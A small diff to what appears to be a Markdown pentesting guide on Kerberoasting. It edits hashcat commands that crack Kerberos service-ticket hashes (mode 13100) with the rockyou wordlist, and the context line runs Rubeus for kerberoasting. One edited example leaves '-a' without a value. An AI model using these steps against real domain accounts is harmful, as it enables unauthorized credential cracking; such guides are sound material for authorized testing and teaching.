@@ -78,9 +78,9 @@ C:\> Rubeus.exe kerberoast
 ### (3) Perform dictionary attack on the obtained TGS
 
 ```sh
-$ hashcat -a 0 -m 13100 <path_to_spn_hash> 
+$ hashcat -a 0 -m 13100 <path_to_spn_hash> <wordlist>
 # eg. 
-$ echo > spn.hash 
+$ echo xxx > spn.hash 
 $ hashcat -a -m 13100 spn.hash /usr/share/wordlist/rockyou.txt
 ```
 
